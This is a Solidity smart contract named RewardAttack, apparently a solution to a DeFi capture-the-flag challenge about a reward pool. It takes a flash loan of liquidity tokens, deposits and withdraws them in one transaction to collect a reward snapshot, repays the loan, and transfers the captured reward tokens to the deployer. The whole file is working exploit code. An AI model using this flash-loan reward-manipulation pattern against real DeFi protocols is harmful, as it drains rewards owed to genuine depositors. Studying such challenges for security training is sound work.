// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 _amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

contract RewardAttack {

    using Address for address;
    address public owner;
    IFlashLoanerPool private flashLoanerPool;
    ITheRewarderPool private rewarderPool;
    IERC20 private rewardToken;
    IERC20 private liquidityToken;

    constructor() {
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 _amount) public {
        //Have to approve before deposit
        liquidityToken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        //return borrowed tokens
        liquidityToken.transfer(address(flashLoanerPool),_amount);
    }

    function attack(
        address _liquidityToken,
        address _flashLoanerPool,
        address _rewarderPool,
        address _rewardToken,
        uint256 _amount
    ) public {
        liquidityToken = IERC20(_liquidityToken);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        rewardToken = IERC20(_rewardToken);

        //Start flashloan
        IFlashLoanerPool(_flashLoanerPool).flashLoan(_amount);
        //withdraw reward token 
        IERC20(rewardToken).transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
